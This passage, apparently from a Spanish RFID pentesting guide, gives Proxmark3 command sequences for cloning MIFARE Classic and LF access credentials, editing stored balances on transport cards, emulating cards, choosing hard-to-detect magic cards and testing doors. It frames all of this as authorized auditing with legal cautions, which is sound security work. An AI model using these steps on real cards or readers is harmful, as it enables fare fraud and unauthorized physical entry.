- **Sectores 1-15**: Igual estructura (bloques de datos + sector trailer).

**Aplicación en el Mundo Real**: La eficacia de estas técnicas de ataque no es meramente teórica. Han sido demostradas públicamente contra sistemas de transporte a gran escala:

- **Oyster Card (Londres)**: El sistema fue comprometido en 2008, demostrando que las claves de transporte no estaban adecuadamente protegidas.
- **OV-Chipkaart (Países Bajos)**: Vulnerabilidades similares forzaron actualizaciones masivas del sistema.
- **Sistemas de metro de Boston, Madrid y otros**: También fueron objeto de demostraciones académicas de estas vulnerabilidades.

Estos casos obligaron a los operadores a actualizar su infraestructura de seguridad, implementar nuevas tecnologías (como Mifare DESFire, MIFARE Plus o sistemas basados en tokens únicos) y reforzar la protección de las claves criptográficas.

La capacidad de leer y volcar el contenido completo de una tarjeta es el prerrequisito para el siguiente y más impactante paso de la auditoría: la clonación y manipulación de datos.

## 3. Clonación y Manipulación

### 3.1. Creación de un Backup y Clonación

La clonación de una tarjeta RFID es una prueba de concepto definitiva que demuestra una vulnerabilidad crítica en un sistema de control de acceso. Más allá de un simple duplicado, representa la materialización de un riesgo: la capacidad de un actor malicioso para crear una credencial funcional indistinguible de la original. Este paso es crucial para comunicar el impacto real de las debilidades criptográficas a las partes interesadas.

El proceso de clonación de una tarjeta Mifare Classic se realiza en dos etapas fundamentales:

#### 1. Creación del Archivo de Backup

Como se mencionó anteriormente, comandos como `hf mf autopwn` generan automáticamente un archivo de volcado de la memoria (dump) al finalizar con éxito. Este archivo, cuyo nombre incluye el UID de la tarjeta original (p. ej., `hf-mf-A29558E4-dump.bin`), sirve como la "fuente" o el "backup" completo de la tarjeta original.

**Archivos generados automáticamente:**
- `hf-mf-<UID>-dump.bin` - Volcado binario completo
- `hf-mf-<UID>-dump.eml` - Formato emulador (texto)
- `hf-mf-<UID>-dump.json` - Formato JSON estructurado
- `hf-mf-<UID>-key.bin` - Todas las claves recuperadas

#### 2. Clonación a una Tarjeta Mágica

La clonación de una tarjeta Mifare Classic requiere una tarjeta virgen especial, comúnmente conocida como "tarjeta mágica". Existen diferentes tipos de tarjetas mágicas, cada una con características y métodos de escritura específicos:

**Tipos de Tarjetas Mágicas:**

| Tipo | Nombre Alternativo | Características | Detección |
|------|-------------------|-----------------|----------|
| **Gen1A** | UID, ZERO (RU) | Comandos backdoor `40(7)`, `43` | Fácilmente detectable |
| **Gen2** | CUID, DirectWrite | Escritura directa a bloque 0 | Difícil de detectar |
| **Gen3** | APDU | Comandos APDU especiales | Muy difícil de detectar |
| **Gen4** | Ultimate Magic Card (UMC) | Completamente configurable | Indetectable si configurada correctamente |

**Proceso de Clonación Completo:**

##### Método 1: Secuencia Automatizada (Recomendado para Gen2/CUID)

```bash
# Para tarjetas Gen2/CUID (más modernas y difíciles de detectar)
hf mf restore --1k --uid A29558E4 -k hf-mf-A29558E4-key.bin -f hf-mf-A29558E4-dump.bin
```

**Parámetros del comando restore:**

| Parámetro | Descripción |
|-----------|-------------|
| `--1k` / `--2k` / `--4k` / `--mini` | Tamaño de la tarjeta objetivo |
| `--uid <hex>` | UID de la tarjeta original (opcional, se lee del dump) |
| `-k, --keys <fn>` | Archivo con las claves |
| `-f, --file <fn>` | Archivo de dump a restaurar |
| `--emu` | Cargar datos en el emulador después de restaurar |

##### Método 2: Clonación Manual para Tarjetas Gen1A

Las tarjetas Gen1A requieren comandos especiales de backdoor para modificar el bloque 0:

```bash
# 1. Identificar el tipo de tarjeta mágica
hf mf info
# Salida esperada: [+] Magic capabilities... Gen 1a

# 2. Limpiar la tarjeta (opcional pero recomendado)
# Para 1K:
hf mf cwipe -u A29558E4 -a 0004 -s 08
# Para 4K:
hf mf cwipe -u A29558E4 -a 0044 -s 18

# 3. Cargar el dump en la tarjeta usando comandos Gen1a
hf mf cload -f hf-mf-A29558E4-dump.bin

# 4. Establecer el UID (si no se estableció con cload)
hf mf csetuid -u A29558E4 -a 0004 -s 08

# 5. Verificar la clonación
hf mf info
hf mf dump --1k
```

**Comandos Gen1A disponibles:**

| Comando | Función |
|---------|----------|
| `hf mf csetuid` | Establecer UID en tarjeta Gen1a |
| `hf mf cwipe` | Limpiar tarjeta a valores por defecto |
| `hf mf csetblk` | Escribir bloque individual vía backdoor |
| `hf mf cgetblk` | Leer bloque individual vía backdoor |
| `hf mf cgetsc` | Leer sector completo vía backdoor |
| `hf mf cload` | Cargar dump completo en tarjeta |
| `hf mf csave` | Guardar contenido de tarjeta |
| `hf mf cview` | Visualizar contenido de tarjeta |

##### Método 3: Clonación con Tarjetas Gen3 (APDU)

Las tarjetas Gen3 utilizan comandos APDU estándar, haciéndolas compatibles con Android:

```bash
# Cambiar solo el UID (recomendado para Gen3)
hf mf gen3uid -u A29558E4

# O escribir el bloque 0 completo
hf mf gen3blk -d A29558E4440804006263646566676869

# ADVERTENCIA: Bloquear permanentemente (irreversible)
# hf mf gen3freeze
```

**Advertencias Críticas:**

**ADVERTENCIA - Tarjetas Gen1A:**
- Son fácilmente detectables por sistemas de seguridad modernos
- Algunos lectores ejecutan el comando de detección `40(7)` automáticamente
- NO recomendadas para entornos con medidas anti-clonación activas

**ADVERTENCIA - Tarjetas Gen2:**
- Más difíciles de detectar que Gen1A
- Algunos sistemas pueden detectarlas mediante pruebas de escritura directa al bloque 0
- El ATQA y SAK pueden variar según el fabricante

**ADVERTENCIA - Configuración de ATQA/SAK:**
- Debe coincidir **exactamente** con la tarjeta original
- ATQA incorrecto puede causar que la tarjeta no sea reconocida
- SAK incorrecto puede revelar que es una tarjeta mágica

**ADVERTENCIA - Recuperación de Tarjeta "Bricked":**

Si una tarjeta Gen2 no responde después de escribir datos incorrectos en el bloque 0:

```bash
# Forzar configuración de anticollision
hf 14a config --atqa force --bcc ignore --cl2 skip --rats skip

# Escribir bloque 0 correcto
# Para 1K:
hf mf wrbl --blk 0 -k FFFFFFFFFFFF -d 11223344440804006263646566676869 --force
# Para 4K:
hf mf wrbl --blk 0 -k FFFFFFFFFFFF -d 11223344441802006263646566676869 --force

# Restaurar configuración estándar
hf 14a config --std
hf 14a reader
```

### 3.2. Manipulación de Datos

Más allá de la clonación 1:1, la verdadera amenaza para muchos sistemas reside en la capacidad de un atacante para alterar datos específicos dentro de la tarjeta. En sistemas que almacenan saldos, permisos o contadores, la manipulación de datos puede tener un impacto directo, como aumentar el crédito en una tarjeta de transporte o cambiar los niveles de acceso.

#### Proceso de Manipulación de Datos

##### Paso 1: Obtener y Convertir el Volcado

Dependiendo del formato del archivo de volcado, puede ser necesario convertirlo para facilitar la edición:

**Formatos de archivo disponibles:**

| Formato | Extensión | Descripción | Uso |
|---------|-----------|-------------|-----|
| Binario | `.bin` | Datos crudos de la tarjeta | Herramientas hex, scripts |
| Emulador | `.eml` | Formato de texto legible | Edición manual fácil |
| JSON | `.json` | Estructura de datos completa | Scripts, análisis automatizado |

**Conversión entre formatos:**

```bash
# Convertir .bin a .eml (más fácil de editar)
script run data_mf_bin2eml -i hf-mf-A29558E4-dump.bin -o modified.eml

# Convertir .eml de vuelta a .bin después de editar
script run data_mf_eml2bin -i modified.eml -o modified.bin
```

##### Paso 2: Editar el Volcado

**Método 1: Edición Hexadecimal (Binario)**

1. Abrir el archivo `.bin` en un editor hexadecimal (HxD, Bless, hexedit, etc.)
2. Localizar los bytes específicos a modificar:
   - **Bloques de valor**: Bloques configurados para almacenar saldo (formato especial de 4 bytes duplicados)
   - **Bloques de datos**: Información de usuario (permisos, identificadores, etc.)
   - **Sector trailers**: Claves y bits de acceso (bloques 3, 7, 11, etc.)

**Estructura de un bloque de valor Mifare Classic:**

```
Byte:    0  1  2  3  |  4  5  6  7  |  8  9 10 11 | 12 13 14 15
Datos: [Valor (LSB)] [~Valor     ] [Valor      ] [Addr][~Addr][Addr][~Addr]
```

Ejemplo de saldo de 100 unidades (0x00000064) en bloque 4:
```
64 00 00 00  9B FF FF FF  64 00 00 00  04 FB 04 FB
```

**Método 2: Edición de Texto (EML)**

El formato `.eml` muestra cada bloque como una línea de 32 caracteres hexadecimales:

```
# Ejemplo: hf-mf-modified.eml
A29558E4440804006263646566676869  <- Bloque 0 (UID + Manufacturer)
00000000000000000000000000000000  <- Bloque 1 (datos)
00000000000000000000000000000000  <- Bloque 2 (datos)
FFFFFFFFFFFF787788C1FFFFFFFFFFFF  <- Bloque 3 (sector trailer)
64000000 9BFFFFFF 64000000 04FB04FB  <- Bloque 4 (bloque de valor: 100 unidades)
...
```

**Herramientas de edición:**

```bash
# Editar manualmente con editor de texto
nano modified.eml

# O usar herramientas específicas de Proxmark3
hf mf eview -f hf-mf-A29558E4-dump.eml  # Visualizar contenido
```

##### Paso 3: Escribir los Datos Modificados

**Opción A: Restauración Completa**

```bash
# Restaurar desde archivo binario modificado
hf mf restore --1k -f modified.bin -k hf-mf-A29558E4-key.bin

# Restaurar desde archivo EML (convertir primero a .bin)
script run data_mf_eml2bin -i modified.eml -o modified.bin
hf mf restore --1k -f modified.bin -k hf-mf-A29558E4-key.bin
```

**Opción B: Escritura Selectiva de Bloques**

Para modificar solo bloques específicos sin sobrescribir toda la tarjeta:

```bash
# Escribir un bloque individual (requiere clave válida)
hf mf wrbl --blk 4 -a -k FFFFFFFFFFFF -d 64000000 9BFFFFFF 64000000 04FB04FB

# Para tarjetas Gen1a (usando backdoor, sin necesidad de clave)
hf mf csetblk --blk 4 -d 64000000 9BFFFFFF 64000000 04FB04FB
```

**Opción C: Manipulación de Bloques de Valor**

Los bloques de valor tienen comandos especiales para incrementar/decrementar:

```bash
# Ver información de bloques de valor
hf mf value -h

# Incrementar un bloque de valor
hf mf value --blk 4 -a -k FFFFFFFFFFFF --inc 100

# Decrementar un bloque de valor
hf mf value --blk 4 -a -k FFFFFFFFFFFF --dec 50

# Restaurar desde bloque de respaldo
hf mf value --blk 4 -a -k FFFFFFFFFFFF --res
```

##### Paso 4: Verificación de Cambios

```bash
# Leer y verificar el bloque modificado
hf mf rdbl --blk 4 -a -k FFFFFFFFFFFF

# Verificar bloque de valor específicamente
hf mf value --blk 4 -a -k FFFFFFFFFFFF

# Dump completo para comparar
hf mf dump --1k -f verification.bin
```

#### Ejemplos Prácticos de Manipulación

**Caso 1: Modificar Saldo en Tarjeta de Transporte**

```bash
# 1. Obtener dump original
hf mf autopwn

# 2. Identificar bloque de saldo (ejemplo: bloque 4)
hf mf view -f hf-mf-<UID>-dump.bin

# 3. Convertir a EML para edición
script run data_mf_bin2eml -i hf-mf-<UID>-dump.bin

# 4. Editar bloque 4 en el archivo .eml
# Cambiar saldo de 10 a 500 unidades
# Original: 0A000000 F5FFFFFF 0A000000 04FB04FB
# Modificado: F4010000 0BFEFFFF F4010000 04FB04FB (500 en hex = 0x1F4)

# 5. Convertir de vuelta a .bin
script run data_mf_eml2bin -i hf-mf-<UID>-dump.eml -o modified.bin

# 6. Restaurar en tarjeta mágica
hf mf restore --1k -f modified.bin -k hf-mf-<UID>-key.bin
```

**Caso 2: Cambiar Permisos de Acceso**

```bash
# Modificar bits de acceso para permitir escritura en bloques de datos
# ADVERTENCIA: Bits de acceso incorrectos pueden bloquear la tarjeta permanentemente

# Ejemplo de sector trailer con acceso modificado
# Bloque 7 (trailer del sector 1):
# FFFFFFFFFFFF 787788 C1 FFFFFFFFFFFF
#              ^^^^^^ ^^  <- Access bits y GPB

# Para cambiar a permisos más permisivos (FF 07 80):
hf mf wrbl --blk 7 -b -k FFFFFFFFFFFF -d FFFFFFFFFFFFF00780 80 FFFFFFFFFFFF
```

**Advertencias Críticas:**

**ADVERTENCIA - Bits de Acceso:**
- Los bits de acceso controlan qué claves pueden leer/escribir cada bloque
- Configuración incorrecta puede **bloquear permanentemente** el sector
- Siempre verificar con `hf mf acl -d <hex>` antes de escribir
- NO modificar bits de acceso sin comprender completamente su funcionamiento

**ADVERTENCIA - Bloques de Valor:**
- Deben mantener el formato especial: Valor, ~Valor, Valor, Addr
- El formato es validado por hardware en algunos lectores
- Valores inconsistentes pueden ser rechazados o causar errores

**ADVERTENCIA - Sector Trailers:**
- NUNCA modificar el sector trailer (bloque 3, 7, 11, etc.) sin backup
- Perder las claves significa perder acceso permanente al sector
- La clave B puede estar oculta (no legible) dependiendo de los bits de acceso

**ADVERTENCIA - Aspectos Legales:**
- La manipulación de tarjetas de pago, transporte o acceso ajenas es **ilegal**
- Solo realizar en auditorías autorizadas o con sistemas propios
- Documentar todos los cambios para el informe de auditoría

Una vez que la tarjeta ha sido clonada o sus datos han sido manipulados, el siguiente paso es validar su funcionamiento en un entorno real o mediante simulación.

## 4. Pruebas Reales y Simulación

### 4.1. Simulación de Tarjetas

La simulación es una capacidad táctica extremadamente valiosa del Proxmark3. Permite emular el comportamiento de una tarjeta RFID sin necesidad de tener una tarjeta física clonada. Esto convierte al Proxmark3 en una herramienta de auditoría de campo muy versátil, ya que el propio dispositivo puede actuar como la credencial, permitiendo al auditor probar un sistema de acceso con solo llevar el Proxmark3.

El procedimiento para simular tarjetas varía según la frecuencia:

#### Simulación de Alta Frecuencia (HF) - Mifare Classic

El Proxmark3 puede emular una tarjeta Mifare Classic completa utilizando como fuente un archivo de volcado de memoria previamente obtenido. El proceso requiere dos pasos: cargar los datos en la memoria del emulador y luego iniciar la simulación.

**Procedimiento completo de simulación:**

##### Paso 1: Cargar Datos en el Emulador

Primero, es necesario cargar el volcado de la tarjeta en la memoria del emulador del Proxmark3:

```bash
# Cargar desde archivo binario
hf mf eload -f hf-mf-353C2AA6-dump.bin --1k

# Cargar desde archivo EML
hf mf eload -f hf-mf-353C2AA6-dump.eml --1k

# Cargar desde archivo JSON
hf mf eload -f hf-mf-353C2AA6-dump.json --1k
```

**Parámetros del comando eload:**

| Parámetro | Descripción |
|-----------|-------------|
| `-f, --file <fn>` | Nombre del archivo de dump a cargar |
| `--mini` | Mifare Classic Mini / S20 |
| `--1k` | Mifare Classic 1k / S50 (por defecto) |
| `--2k` | Mifare Classic/Plus 2k |
| `--4k` | Mifare Classic 4k / S70 |
| `--ul` | Mifare Ultralight family |
| `-q, --qty <dec>` | Número de bloques a cargar (sobrescribe detección automática) |

##### Paso 2: Iniciar la Simulación

Una vez cargados los datos, inicia la simulación:

```bash
# Simulación básica (usa UID del emulador)
hf mf sim

# Simulación con UID específico
hf mf sim -u 353C2AA6

# Simulación con UID de 7 bytes
hf mf sim -u 04112233445566

# Simulación interactiva (muestra comandos del lector)
hf mf sim -i

# Simulación con logging extendido
hf mf sim -x
```

**Parámetros del comando sim:**

| Parámetro | Descripción |
|-----------|-------------|
| `-u, --uid <hex>` | UID de 4 o 7 bytes. Si no se especifica, usa el del emulador |
| `-i, --interactive` | Modo interactivo (muestra comandos anti-collision y auth) |
| `-x, --crack` | Modo crack (activa logging PRNG para ataques) |
| `-e, --emul` | Rellena el emulador con claves encontradas durante la simulación |
| `-v, --verbose` | Salida verbose |

**Secuencia completa recomendada:**

```bash
# 1. Obtener dump de la tarjeta original
hf mf autopwn

# 2. Cargar el dump en el emulador
hf mf eload -f hf-mf-353C2AA6-dump.bin --1k

# 3. Verificar que se cargó correctamente
hf mf eview

# 4. Iniciar simulación
hf mf sim -u 353C2AA6

# 5. Presentar el Proxmark3 al lector objetivo
# El dispositivo actuará como la tarjeta clonada
```

**Verificación de la memoria del emulador:**

```bash
# Ver contenido cargado en el emulador
hf mf eview

# Obtener bloque específico del emulador
hf mf egetblk --blk 0

# Obtener sector específico del emulador
hf mf egetsc --sector 0

# Guardar contenido del emulador a archivo
hf mf esave -f backup-emulator.bin
```

#### Simulación de Baja Frecuencia (LF) - EM410x y Otros

Para etiquetas LF más simples, como las de tipo EM410x (llaveros comunes), la simulación es directa ya que solo transmiten un ID:

```bash
# Simulación básica con ID conocido
lf em 410x sim --id 0F0368568B

# Simulación desde reloj (genera ID basado en tiempo)
lf em 410x sim --clk
```

**Simulación de otros formatos LF:**

```bash
# HID Prox
lf hid sim -r 200670012d                    # Simular desde raw
lf hid sim -w H10301 --fc 101 --cn 1337    # Simular con facility/card number

# Indala
lf indala sim -r a0000000c2c436c1          # Simular desde raw
lf indala sim --heden 888                   # Simular formato Heden

# Simulación de etiqueta T55xx guardada
lf t55xx detect                              # Detectar configuración
lf sim                                       # Simular desde buffer
```

**Ejemplo práctico completo - Clonar y simular HID Prox:**

```bash
# 1. Leer tarjeta HID original
lf hid read
# Salida: HID Prox TAG ID: 2006ec0c86 (13374) - Format Len: 26 bit - FC: 101 - Card: 1337

# 2. Simular inmediatamente (datos en buffer)
lf hid sim

# 3. O simular con datos específicos
lf hid sim -w H10301 --fc 101 --cn 1337
```

### 4.2. Clonación de Etiquetas de Baja Frecuencia (Llaveros)

Aunque el concepto de clonación es similar al de HF, el procedimiento para etiquetas de Baja Frecuencia (LF) es diferente y utiliza comandos específicos. Las etiquetas LF, como los llaveros de acceso comunes (tipo EM410x, HID Prox), suelen ser más simples y solo transmiten un ID, pero requieren configurar correctamente el chip virgen (T5577, EM4305).

#### Clonación de EM410x (Llaveros Genéricos)

El proceso para clonar una etiqueta EM410x en una etiqueta virgen reescribible T5577 es el siguiente:

##### Paso 1: Leer la Etiqueta Original

Coloca el llavero o tarjeta LF original en la antena LF del Proxmark3:

```bash
# Método 1: Lectura específica EM410x
lf em 410x reader

# Método 2: Búsqueda automática (recomendado)
lf search
```

**Salida esperada:**
```
[+] EM 410x ID: 0F0368568B
[+] EM410x XL ID: 00 0F 03 68 56 8B
```

##### Paso 2: Escribir en la Etiqueta Virgen

Retira la etiqueta original y coloca una etiqueta T5577 (o compatible) virgen:

```bash
# Clonar con ID leído anteriormente
lf em 410x clone --id 0F0368568B

# O clonar a chip Q5/T5555
lf em 410x clone --id 0F0368568B --q5

# O clonar a chip EM4305
lf em 410x clone --id 0F0368568B --em
```

**Parámetros del comando clone:**

| Parámetro | Descripción |
|-----------|-------------|
| `--id <hex>` | ID de 5 bytes (10 caracteres hexadecimales) |
| `--q5` | Escribir en chip Q5/T5555 en lugar de T55x7 |
| `--em` | Escribir en chip EM4305/4469 |

##### Paso 3: Verificación

```bash
# Verificar que la clonación fue exitosa
lf em 410x reader
# Debe mostrar el mismo ID que la original

# O búsqueda completa
lf search
```

#### Clonación de HID Prox (Control de Acceso)

Las tarjetas HID Prox son muy comunes en sistemas de control de acceso corporativo:

##### Secuencia Completa:

```bash
# 1. Leer tarjeta HID original
lf hid read
# Salida ejemplo: HID Prox TAG ID: 2006ec0c86 - Format: H10301 - FC: 101 - Card: 1337

# 2. Método de clonación A: Usando raw data
lf hid clone -r 2006ec0c86

# 3. Método de clonación B: Usando facility code y card number (más claro)
lf hid clone -w H10301 --fc 101 --cn 1337

# 4. Para chips Q5/T5555
lf hid clone -w H10301 --fc 101 --cn 1337 --q5

# 5. Para chips EM4305
lf hid clone -w H10301 --fc 101 --cn 1337 --em

# 6. Verificar clonación
lf hid read
```

**Formatos Wiegand comunes:**

| Formato | Descripción | Bits |
|---------|-------------|------|
| H10301 | HID Corporate 1000 (más común) | 26 |
| H10302 | HID Corporate 1000 | 37 |
| H10304 | HID Corporate 1000 | 37 |
| H10320 | HID Simplex | 36 |

#### Clonación de Indala

Para sistemas que usan tarjetas Indala:

```bash
# 1. Leer tarjeta Indala
lf indala read

# 2. Clonar usando raw data
lf indala clone -r a0000000c2c436c1

# 3. O usando formato Heden
lf indala clone --heden 888

# 4. Con facility code y card number (formato H10301)
lf indala clone --fc 101 --cn 1337

# 5. Verificar
lf indala read
```

#### Configuración Manual del Chip T55xx

Para clonaciones avanzadas o cuando los comandos automáticos fallan:

```bash
# 1. Detectar chip virgen
lf t55xx detect

# 2. Configurar para EM410x
lf t55xx config --FSK --bi --inv --rf 64

# 3. Escribir datos en bloques
lf t55xx write -b 0 -d 00148040  # Configuración
lf t55xx write -b 1 -d 0F036856  # Datos ID parte 1
lf t55xx write -b 2 -d 8B000000  # Datos ID parte 2

# 4. Verificar escritura
lf t55xx read
lf em 410x reader
```

**Configuraciones T55xx para diferentes formatos:**

| Formato | Modulación | Configuración |
|---------|-----------|---------------|
| EM410x | ASK/Manchester | `--ASK --bi --inv` |
| HID Prox | FSK | `--FSK --rf 50` |
| Indala | PSK | `--PSK1 --rf 32` |

#### Borrado/Reset de Chip T55xx

Si necesitas borrar un chip T55xx para reutilizarlo:

```bash
# Limpiar configuración (restaurar a valores por defecto)
lf t55xx wipe

# O escribir configuración específica
lf t55xx write -b 0 -d 00088048
```

**Advertencias Importantes:**

**ADVERTENCIA - Compatibilidad de Chips:**
- No todos los chips vírgenes son compatibles con todos los formatos
- T55x7/T5577: Más versátil, compatible con la mayoría de formatos
- Q5/T5555: Similar a T55x7 pero con algunas diferencias de timing
- EM4305/4469: Específico para formatos ASK, no soporta FSK complejo

**ADVERTENCIA - Calidad de la Antena:**
- La clonación LF requiere **muy buena proximidad** entre chip y antena
- Mantén el chip centrado sobre la antena LF del Proxmark3
- Algunos chips requieren múltiples intentos de escritura

**ADVERTENCIA - Detección de Clones:**
- Algunos lectores avanzados pueden detectar chips T55xx
- Lectores que verifican características específicas del chip original pueden rechazar clones
- Sistemas HID modernos pueden usar "Secure Identity" (no clonable con T55xx)

**ADVERTENCIA - Protección con Contraseña:**
- Algunos chips T55xx pueden tener contraseña configurada
- Si el chip está protegido, primero debes detectar/recuperar la contraseña
- Usar `lf t55xx detect` con opciones de contraseña si es necesario

### 4.3. Pruebas de Acceso Físico

El objetivo final de una auditoría de control de acceso es verificar si un sistema físico real es vulnerable. La clonación y simulación de credenciales son los medios para alcanzar este fin. Esta fase requiere una metodología estructurada para documentar adecuadamente los resultados y garantizar que se mantienen los límites éticos y legales de la auditoría.

#### Metodología de Pruebas de Acceso

##### Fase 1: Preparación y Autorización

**Requisitos previos obligatorios:**

1. **Autorización por Escrito:**
   - Obtener autorización explícita y por escrito del propietario del sistema
   - Definir claramente el alcance de las pruebas (ubicaciones, horarios, métodos)
   - Establecer procedimientos de escalación en caso de incidentes

2. **Coordinación:**
   - Informar al personal de seguridad sobre la auditoría
   - Coordinar horarios para minimizar interrupciones
   - Establecer puntos de contacto para emergencias

3. **Preparación del Equipo:**
   - Verificar que las credenciales clonadas/simuladas funcionan antes de la prueba
   - Preparar equipos de respaldo (tarjetas adicionales, baterías)
   - Documentación lista para registro en tiempo real

##### Fase 2: Ejecución de Pruebas

**Procedimiento de validación:**

**Opción A: Prueba con Tarjeta Clonada**

```bash
# Preparación previa
# 1. Clonar tarjeta en entorno controlado
hf mf autopwn                           # Obtener dump
hf mf restore --1k -f dump.bin         # Restaurar en tarjeta mágica
hf mf info                              # Verificar clonación

# 2. En campo: Presentar tarjeta clonada al lector
# - Aproximar la tarjeta al lector (distancia típica: 1-10 cm)
# - Observar respuesta del sistema (LED, sonido, apertura)
# - Documentar resultado inmediatamente
```

**Opción B: Prueba con Simulación (Proxmark3)**

```bash
# Preparación
hf mf eload -f dump.bin --1k           # Cargar dump en emulador
hf mf sim -u 04112233                  # Iniciar simulación

# En campo: 
# - Mantener Proxmark3 conectado a batería externa
# - Aproximar antena HF del Proxmark3 al lector (muy cerca, <5cm)
# - El Proxmark3 debe estar en modo sim activo
# - Observar LEDs del Proxmark3 (indican comunicación)
# - Documentar interacción
```

**Opción C: Prueba con Llavero LF Clonado**

```bash
# Preparación
lf em 410x clone --id 0F0368568B      # Clonar a T5577
lf em 410x reader                      # Verificar

# En campo:
# - Aproximar llavero clonado al lector (1-15 cm)
# - Algunos lectores LF requieren contacto muy cercano
# - Documentar respuesta del sistema
```

##### Fase 3: Documentación de Resultados

**Información a registrar por cada prueba:**

| Campo | Descripción | Ejemplo |
|-------|-------------|--------|
| Fecha/Hora | Timestamp de la prueba | 2025-12-06 14:30:15 |
| Ubicación | Lector específico probado | Puerta principal oficina 3er piso |
| Tipo de credencial | Original/Clonada/Simulada | Clonada en Gen2 CUID |
| UID utilizado | Identificador de la credencial | 04112233445566 |
| Método | Técnica de clonación usada | hf mf autopwn + restore |
| Resultado | Exitoso/Fallido | Exitoso - Puerta abierta |
| Observaciones | Detalles adicionales | LED verde, beep, apertura inmediata |
| Evidencia | Fotos/videos (si autorizado) | IMG_20251206_143015.jpg |

**Template de registro:**

```
=== REGISTRO DE PRUEBA DE ACCESO ===
Fecha: 2025-12-06 14:30:15
Auditor: [Nombre]
Ubicación: Puerta principal, 3er piso

CREDENCIAL ORIGINAL:
- Tipo: Mifare Classic 1K
- UID: 04112233445566
- Método de obtención: Préstamo autorizado de empleado
- Ataques exitosos: hf mf autopwn (nested attack)

CREDENCIAL CLONADA:
- Tarjeta: Gen2 CUID
- UID clonado: 04112233445566
- Verificación previa: OK (hf mf info)

RESULTADO:
✓ EXITOSO
- Lector respondió inmediatamente
- LED cambió de rojo a verde
- Sonido de confirmación
- Puerta se desbloqueó
- Tiempo de respuesta: <1 segundo

IMPLICACIONES:
- Sistema vulnerable a clonación
- No hay detección de tarjetas mágicas
- No hay validación adicional (PIN, biométrico)

RECOMENDACIONES:
1. Migrar a tecnología más segura (DESFire EV2/EV3)
2. Implementar autenticación multifactor
3. Monitoreo de intentos de acceso duplicados
===================================
```

##### Fase 4: Escenarios de Prueba Específicos

**Escenario 1: Control de Acceso de Puerta**

```
Objetivo: Verificar si un clon permite acceso no autorizado

Pasos:
1. Obtener credencial legítima (préstamo autorizado)
2. Extraer claves: hf mf autopwn
3. Clonar a tarjeta mágica Gen2
4. Devolver credencial original al propietario
5. Intentar acceso con credencial clonada
6. Documentar: ¿Se otorgó acceso? ¿Hay logging?

Resultado esperado: Si exitoso, demuestra vulnerabilidad crítica
```

**Escenario 2: Sistema de Fichaje Laboral**

```
Objetivo: Verificar suplantación de identidad en sistema de asistencia

Pasos:
1. Clonar credencial de empleado (con autorización)
2. Intentar fichar con credencial clonada
3. Verificar si el sistema registra la asistencia
4. Comprobar si se detecta uso simultáneo (credencial original + clon)

Resultado esperado: Detección de fraude de asistencia
```

**Escenario 3: Llavero de Parking/Barreras**

```
Objetivo: Clonar llavero LF de acceso vehicular

Pasos:
1. Leer llavero: lf search
2. Clonar a T5577: lf em 410x clone --id <ID>
3. Probar llavero clonado en barrera
4. Verificar apertura y logging del sistema

Resultado esperado: Acceso vehicular no autorizado
```

#### Detección y Contramedidas Durante Pruebas

**Indicadores de que el sistema puede estar detectando la clonación:**

- Lector parpadea pero no abre (posible detección)
- Demora inusual en la respuesta del lector
- Sonido de error o LED rojo prolongado
- Sistema solicita autenticación adicional (PIN)
- Alerta de seguridad activada

**Si el sistema detecta la clonación:**

1. **Detener inmediatamente** el intento
2. Contactar al punto de contacto de seguridad
3. Documentar el mecanismo de detección (información valiosa)
4. Evaluar contramedidas implementadas
5. Incluir en el informe como punto positivo de seguridad

#### Consideraciones Éticas y Legales

**ADVERTENCIAS CRÍTICAS:**

**Aspectos Legales:**
- La clonación de credenciales ajenas **sin autorización es ilegal** en la mayoría de jurisdicciones
- Puede constituir delitos de:
  - Acceso no autorizado a sistemas informáticos
  - Suplantación de identidad
  - Robo de servicios
  - Fraude
- Las penas pueden incluir prisión y multas significativas

**Límites de la Auditoría:**
- Solo probar en sistemas expresamente autorizados
- No exceder el alcance definido en el contrato
- No acceder a áreas no incluidas en la autorización
- No clonar credenciales de personas no informadas sin autorización del responsable del sistema

**Responsabilidad Profesional:**
- Mantener confidencialidad total de los hallazgos
- No divulgar vulnerabilidades antes de que sean corregidas
- Entregar informe detallado solo a personal autorizado
- Destruir credenciales clonadas al finalizar la auditoría

**Evidencia y Documentación:**
- Fotografías/videos solo con autorización explícita
- Evitar capturar información sensible de terceros
- Almacenar evidencia de forma segura
- Seguir normativas de protección de datos (GDPR, etc.)

Un resultado exitoso, como la apertura de la cerradura o la validación del acceso, confirma de manera inequívoca que el sistema es vulnerable a ataques de clonación, proporcionando una evidencia tangible del riesgo de seguridad que debe ser comunicada al cliente con recomendaciones de remediación específicas.

Tras completar las pruebas manuales, es útil conocer herramientas que pueden automatizar y acelerar estos procesos para auditorías más eficientes.

## 5. Herramientas Avanzadas y Automatización

### 5.1. Acelerando el Proceso de Auditoría

En un escenario de auditoría real, la eficiencia es un factor clave. Mientras que los comandos manuales son excelentes para el aprendizaje y el análisis detallado, las herramientas de automatización permiten al analista pasar de ataques puntuales a evaluaciones rápidas y completas de un sistema. El firmware RRG/Iceman incluye comandos especializados que agilizan dramáticamente el proceso de pentesting de tarjetas RFID.

#### Verificación Rápida de Claves con fchk

El comando `hf mf fchk` (fast check) es una herramienta de verificación de claves optimizada para máxima velocidad. A diferencia de los comandos de lectura tradicionales que intentan autenticarse y luego leer datos, `fchk` **solo realiza el proceso de autenticación**, lo que lo hace significativamente más rápido para validar diccionarios de claves.

**Ventajas de fchk:**
- **5-10 veces más rápido** que métodos tradicionales de verificación
- Puede probar miles de claves en minutos
- Carga diccionarios desde memoria flash (RDV4) para velocidad máxima
- Detecta y almacena claves válidas automáticamente

**Sintaxis y parámetros:**

```bash
# Verificación básica con diccionario
hf mf fchk --1k -f mfc_default_keys.dic

# Verificación usando memoria flash (RDV4)
hf mf fchk --1k --mem

# Verificar clave específica en bloque específico
hf mf fchk --blk 0 -k FFFFFFFFFFFF

# Verificación 4K con diccionario personalizado
hf mf fchk --4k -f custom_keys.dic

# Cargar claves encontradas al emulador automáticamente
hf mf fchk --1k -f mfc_default_keys.dic --emu

# Guardar claves encontradas a archivo binario
hf mf fchk --1k -f mfc_default_keys.dic --dump
```

**Parámetros del comando fchk:**

| Parámetro | Descripción |
|-----------|-------------|
| `-k, --key <hex>` | Clave específica de 12 caracteres hex para probar |
| `--blk <dec>` | Número de bloque específico para probar |
| `-a` | Probar solo clave A (si se encuentra, también verifica B) |
| `-b` | Probar solo clave B |
| `-*, --all` | Probar ambas claves A y B (por defecto) |
| `--mini` | Mifare Classic Mini / S20 |
| `--1k` | Mifare Classic 1k / S50 (por defecto) |
